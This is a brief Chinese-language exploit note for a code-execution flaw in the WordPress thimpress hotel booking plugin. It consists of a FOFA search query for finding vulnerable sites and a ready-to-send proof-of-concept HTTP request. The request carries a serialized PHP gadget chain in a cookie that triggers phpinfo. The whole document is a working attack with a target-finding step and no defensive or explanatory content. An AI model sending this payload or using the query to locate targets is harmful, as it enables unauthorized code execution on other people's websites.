## WordPress-thimpress_hotel_booking存在代码执行漏洞


## fofa
```
body="wp-content/plugins/wp-hotel-booking"
```


## poc
```
GET / HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Connection: close
Cookie: thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"%00WPHB_Logger%00_handles"%3BC:33:"Requests_Utility_FilteredIterator":67:{x:i:0%3Ba:1:{i:0%3Bs:2:"-1"%3B}%3Bm:a:1:{s:11:"%00*%00callback"%3Bs:7:"phpinfo"%3B}}}
Accept-Encoding: gzip

```
